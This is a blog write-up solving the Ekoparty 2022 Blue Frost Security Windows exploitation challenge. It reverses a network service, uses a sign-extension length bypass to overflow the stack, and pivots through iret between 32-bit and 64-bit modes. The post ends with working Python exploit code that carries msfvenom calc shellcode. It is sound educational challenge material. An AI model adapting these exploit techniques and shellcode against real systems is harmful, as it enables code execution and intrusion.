---
categories:
- Windows Userland Exploitation
image:
  path: eko2022_bfs.png
layout: post
media_subpath: /assets/posts/2022-11-03-ekoparty-2022-bfs-windows-challenge
tags:
- binary exploitation
- windows
title: Ekoparty 2022 BFS Windows Challenge
---

In this blog post, we will solve the Windows userland challenge that Blue Frost Security published for Ekoparty 2022. You can find the challenge & description here:

- <https://twitter.com/bluefrostsec/status/1584938670166974464>
- <https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/>

We analyze the **bfs-eko2022.exe** binary in IDA and can see that it’s binding to `0.0.0.0` on port `31415`. After a client connects, it calls `sub_140001160` which is checking that the first 6 bytes received are `Hello\x00`. If that’s the case, it will send back `Hi\x00` and proceeds to call `sub_140001240` where the main packet parsing is done. At the start of this function, it fills a heap buffer as seen below:

![](eko2022_heapinit.png)We can see `0x5050505050505050` being written followed by `0xcf58585858585858`. This is repeated over the full length of the buffer (0x1000). At the beginning of the main function we can see how this buffer is allocated:

```
mov     r9d, 40h        ; flProtect
mov     r8d, 3000h      ; flAllocationType
mov     edx, 1000h      ; dwSize
mov     ecx, 10000000h  ; lpAddress
call    cs:VirtualAlloc
```

This buffer that is being filled is on the heap at `0x10000000` , `read, write, and executable`, and has a size of `0x1000`. This shows that the initialization being done is filling the complete buffer. These initialization values are suspicious as you would normally expect a null initialization or random data. If we [disassemble ](https://defuse.ca/online-x86-assembler.htm#disassembly2)the bytes we get the following instructions:

```
0:  50                      push   eax
1:  50                      push   eax
2:  50                      push   eax
3:  50                      push   eax
4:  50                      push   eax
5:  50                      push   eax
6:  50                      push   eax
7:  50                      push   eax
8:  cf                      iret
9:  58                      pop    eax
a:  58                      pop    eax
b:  58                      pop    eax
c:  58                      pop    eax
d:  58                      pop    eax
e:  58                      pop    eax
f:  58                      pop    eax
```

This does not look random at all and will play a role later on. For now, let’s continue to follow the control flow of the packet parsing function. After the handshake and initialization, it receives more bytes, looking for a magic value `0x323230326F6B45` followed by the byte `T` which indicates the packet type. It then expects another 4 bytes that represent the packet length.

```
mov     rax, 323230326F6B45h
cmp     qword ptr [rsp+0F68h+buf], rax
jz      short loc_140001339
|
movzx   eax, [rsp+0F68h+var_20]
mov     [rsp+0F68h+var_38], al
movsx   eax, [rsp+0F68h+var_38]
cmp     eax, 54h ; 'T'
jz      short loc_140001366
|
movsx   eax, [rsp+0F68h+var_1F]
cmp     eax, 0F00h
jle     short loc_140001386
```

The packet length comparison at the end looks interesting. It’s supposed to make sure that the packet length field can not be larger than `0xf00`. Before the comparison, it’s loading the value with `movsx` into EAX which is `move with sign-extension`. This means if we would send `0xffff` it would get extended to `0xffffffff` and be interpreted as a negative value. Since the last jump has to be taken and `-1` is lower than `0xf00` we pass the check and can continue!

![](eko2022_secondrecv.png)Continuing at `140001386` another receive is called, reading network input data into the heap buffer at `0x10000000`. The maximum amount of data we can provide here is `0x1000`, since anything more than that would go outside the allocated memory and cause an exception. It is then calling `sub_1400011B0` on this data.

This function is now taking the data from the heap and copying it onto the stack, using the length we have provided inside the packet itself! Remember that the intended maximum length is `0xf00` but we were able to provide `0xffff` instead. This leads to a stack overflow. Another thing this function is doing is filtering out `0x2b` and `0x33` while doing to copy operation, replacing them with null bytes on the stack (this will be important later).

After the copy function is finished it will once again check that the packet type is `T` from the copy of the data that is now on the stack. If that’s the case (which it is if used normally) it will echo back the data it received and exit. By using our stack overflow, we can however overwrite the `T` on the stack with an `X` which leads to a *win-*function:

```
movsx   eax, [rsp+0F68h+var_38]
cmp     eax, 58h ; 'X'
jnz     short loc_140001474
|
mov     rcx, cs:buf
add     rcx, rax
mov     rax, rcx
mov     cs:off_14000C000, rax
lea     rcx, [rsp+0F68h+CmdLine] ; lpCmdLine
call    cs:off_14000C000
```

If we can get to this last basic block the program will jump exactly to length+1 of input buffer on the heap which contains the bytes that have been written during initialization. At this point, we control the stack to some extent and can influence to which exact byte of the pre-initialized heap memory we jump. The following PoC brings us to this point.

## Poc 0x01

```python
#!/usr/bin/env python3
import sys, socket, struct
p32 = lambda x: struct.pack('<I', x);

TARGET = '127.0.0.1'
PORT = 31415

sc = b""

p=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
p.connect((TARGET,PORT))

# handshake
p.send(b"Hello\x00")
p.recv(3) # Hi\x00

buf =  b""
buf += b"Eko2022\x00" # magic value  
buf += b"T" # packet type
buf += b"\xff\xff" # sign/type confusion


iret = b""
iret += p32(0x41414141) 	
iret += p32(0x42424242) 			
iret += p32(0x43434343) 	
iret += p32(0x44444444) 	
iret += p32(0x45454545)	

buf += iret
buf += sc
buf += b"A"*(0x0f00-len(iret)-len(sc))
buf += b"X" # X leads to packet type confusion
buf += b"B"*0x07 # we want pops, avoid pushs
p.send(buf)
p.recv(1)
p.close() 
```

When we break on the call instruction we can see that we land on the heap and can single step until the `iret` instruction. Note that we chose the input length in a way we avoid the pushs and land right at the pops in order to fully control the stack at the moment `iret` is called.

```
bp bfs_eko2022+0x146E
g
Breakpoint 0 hit
bfs_eko2022+0x146e:
00007ff7`c7f2146e ff158cab0000    call    qword ptr [bfs_eko2022+0xc000 (00007ff7`c7f2c000)] ds:00007ff7`c7f2c000=0000000010000f08
0:000> t
00000000`10000f08 58              pop     rax
0:000> p
00000000`10000f09 58              pop     rax
0:000> 
00000000`10000f0a 58              pop     rax
0:000> 
00000000`10000f0b 58              pop     rax
0:000> 
00000000`10000f0c 58              pop     rax
0:000> 
00000000`10000f0d 58              pop     rax
0:000> 
00000000`10000f0e 58              pop     rax
0:000> 
00000000`10000f0f cf              iretd
0:000> dd rsp
00000000`005eeb50  41414141 42424242 43434343 44444444
00000000`005eeb60  45454545 41414141 41414141 41414141
```

At this point, we have to do some digging on how `iret` works to see if we can craft the stack in a way that would let us gain (custom-) code execution. The `iret` instruction is used to return control from an exception or interrupt handler and is expecting the following values on the stack (very good [article](http://jamesmolloy.co.uk/tutorial_html/10.-User%20Mode.html) on this topic):

```
- new instruction pointer
- new code segment selector (CS)
- new value of EFLAGS register 
- new stack pointer
- new stack segment selector (SS)
```

As for the instruction pointer and stack pointer we could just point them into our heap buffer since we control a large part of it. The EFLAGS register we can get from debugging and then attempt to use the same value. This leaves us with CS and SS which is a bit tricky. CS and SS are used to index into the Global Descriptor Table (GDT) which has descriptors for kernel code/data and user code/data. Using WinDBG as a kernel debugger we can see which indices match which descriptor:

```
0: kd> dd @gdtr
fffff807`39e95fb0  00000000 00000000 00000000 00000000
fffff807`39e95fc0  00000000 00209b00 00000000 00409300
fffff807`39e95fd0  0000ffff 00cffb00 0000ffff 00cff300
fffff807`39e95fe0  00000000 0020fb00 00000000 00000000
fffff807`39e95ff0  40000067 39008be9 fffff807 00000000
fffff807`39e96000  00003c00 0040f300 00000000 00000000
fffff807`39e96010  00000000 00000000 00000000 00000000
```

The first 16 bytes are reserved, following those we can see that there are some values at offset 0x10 and 0x18:

```
0: kd> dg 0x10
                                                    P Si Gr Pr Lo
Sel        Base              Limit          Type    l ze an es ng Flags
---- ----------------- ----------------- ---------- - -- -- -- -- --------
0010 00000000`00000000 00000000`00000000 Code RE Ac 0 Nb By P  Lo 0000029b
0: kd> dg 0x18
                                                    P Si Gr Pr Lo
Sel        Base              Limit          Type    l ze an es ng Flags
---- ----------------- ----------------- ---------- - -- -- -- -- --------
0018 00000000`00000000 00000000`00000000 Data RW Ac 0 Bg By P  Nl 00000493
```

These should be the entries for the kernel. Then we have 2 more values following:

```
0: kd> dg 0x20
                                                    P Si Gr Pr Lo
Sel        Base              Limit          Type    l ze an es ng Flags
---- ----------------- ----------------- ---------- - -- -- -- -- --------
0020 00000000`00000000 00000000`ffffffff Code RE Ac 3 Bg Pg P  Nl 00000cfb
0: kd> dg 0x28
                                                    P Si Gr Pr Lo
Sel        Base              Limit          Type    l ze an es ng Flags
---- ----------------- ----------------- ---------- - -- -- -- -- --------
0028 00000000`00000000 00000000`ffffffff Data RW Ac 3 Bg Pg P  Nl 00000cf3
```

These are the `user code and stack descriptors` ranging from 0 to 0xffffffff. The 2 least significant bits of the selector value are being used for RPL (Requested Privilege Level) or CPL (Current Privilege Level). Because we are looking to stay in ring3 we have to set these to 1 – so 0x20 for the code segment becomes 0x23 and 0x28 becomes 0x2b.

CS and SS are only used in 32-bit mode (see: <https://nixhacker.com/segmentation-in-intel-64-bit/>) or lower – by supplying values there for our `iret` we will switch to 32-bit mode. With this bit of theory out of the way we still have a problem: 0x2b is a bad byte and will not end up on the stack! So we can choose 0x23 for the code segment but have to be creative on what to use for the stack segment.

Any value that will not crash on `iret` is fine in theory so it has to be `Data RW` but we don’t necessarily need a valid stack base and limit if we can avoid using the stack. After inspecting more values and seeing which ones do and don’t crash we eventually find `0x53`:

```
0:000> dg 0x53
                                                    P Si Gr Pr Lo
Sel        Base              Limit          Type    l ze an es ng Flags
---- ----------------- ----------------- ---------- - -- -- -- -- --------
0053 00000000`0060a000 00000000`00000fff Data RW Ac 3 Bg By P  Nl 000004f3
```

From the output, we can see that base and limit are not really useful for us but if we avoid the stack we should be fine (base and limit are also somewhat random and can change at reboots). Now it’s time to update the PoC:

## Poc 0x02

```python
...
sc =  b""
sc += b"\xcc"
sc += b"\x90"*100
...
iret = b""
iret += p32(0x10000014) 	
iret += p32(0x23) 			 
iret += p32(0x00010202) 	
iret += p32(0x10000400) 	
iret += p32(0x53)
...
```

Debugging the new PoC shows that we indeed end up in 32-bit mode inside our shellcode and can execute it!

```
0:000> 
00000000`10000f0f cf              iretd
0:000> dd rsp
00000000`00cfede0  10000014 00000023 00010202 10000400
00000000`00cfedf0  00000053 41414141 41414141 41414141
0:000> g
10000014 cc              int     3
0:000:x86> p
10000015 90              nop
0:000:x86> p
10000016 90              nop
```

Any attempt to use the stack will however fail (Note that WinDBG will automatically repair 0x53 back to 0x2b if you are single stepping – this can be confusing!). This means we will need to find a way to use the ability to execute shellcode to restore either stack functionality or get back to 64-bit.

As it turns out there is exactly such a [thing](https://stackoverflow.com/questions/39310831/implement-x86-to-x64-assembly-code-switch). By using a far jump like this `0x33:0x100000xx` we can specify 0x33 as the new code segment which will get us back to 64-bit. Since 64-bit does not need a stack segment selector we can now use the stack again! The only thing left to do (besides generating valid shellcode) is to restore the stack pointer. Luckily debugging shows that RCX still holds a reference to the stack so we can just copy it into RSP. After executing the jump into 64-bit mode we can now continue to execute 64-bit shellcode to restore the stack and then anything we like:

**PoC\_0x03**

```python
...
sc =  b""
sc += b"\xcc"
sc += b"\xea\x1c\x00\x00\x10\x33\x00" # from 0x10000014 0x1000001c
sc += b"\x48\x89\xC8\x48\x89\xC4" # restore original stack from ref in rcx
sc += b"\xcc"
...
```

Note that even though 0x33 is a bad byte this is only true for the stack – on the heap where the shellcode lies it will be unchanged. Debugging shows the swap back to 64-bit:

```
10000014 cc                      int     3
0:000:x86> p
10000015 ea1c0000103300          jmp     0033:1000001C
0:000:x86> p
00000000`1000001c 4889c8          mov     rax,rcx
0:000> p
00000000`1000001f 4889c4          mov     rsp,rax
0:000> 
00000000`10000022 cc              int     3
```

For the final exploit, all that is left to do is generate some shellcode, e.g. `msfvenom -p windows/x64/exec cmd="calc" -f python` .

## Final PoC

```python
#!/usr/bin/env python3
# Author: @xct_de

import sys, socket, struct
p32 = lambda x: struct.pack('<I', x);

TARGET = '127.0.0.1'
PORT = 31415

sc =  b""
#sc += b"\xcc"

sc += b"\xea\x1c\x00\x00\x10\x33\x00" # from 0x10000014 (x86) 0x1000001c (x64)
sc += b"\x48\x89\xC8\x48\x89\xC4"     # restore original stack from rcx

# msfvenom -p windows/x64/exec cmd="calc" -f python
sc += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
sc += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
sc += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
sc += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
sc += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
sc += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
sc += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
sc += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
sc += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
sc += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
sc += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
sc += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
sc += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
sc += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
sc += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
sc += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
sc += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
sc += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
sc += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
sc += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
sc += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
sc += b"\xda\xff\xd5\x63\x61\x6c\x63\x00"

p=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
p.connect((TARGET,PORT))

# handshake
p.send(b"Hello\x00")
p.recv(3) # Hi\x00

buf = b""
buf += b"Eko2022\x00" # magic value  
buf += b"T" # packet type
buf += b"\xff\xff" # sign/type confusion

# switch from 64-bit to 32-bit via iret
iret = b""
iret += p32(0x10000014) 	
iret += p32(0x23) 			  
iret += p32(0x00010202) 	
iret += p32(0x10000400) 	
iret += p32(0x53)			    

buf += iret
buf += sc
buf += b"A"*(0x0f00-len(iret)-len(sc))
buf += b"X" # X leads to packet type confusion
buf += b"B"*0x07 # we want pops, avoid pushs
p.send(buf)
p.recv(1)
p.close() 
```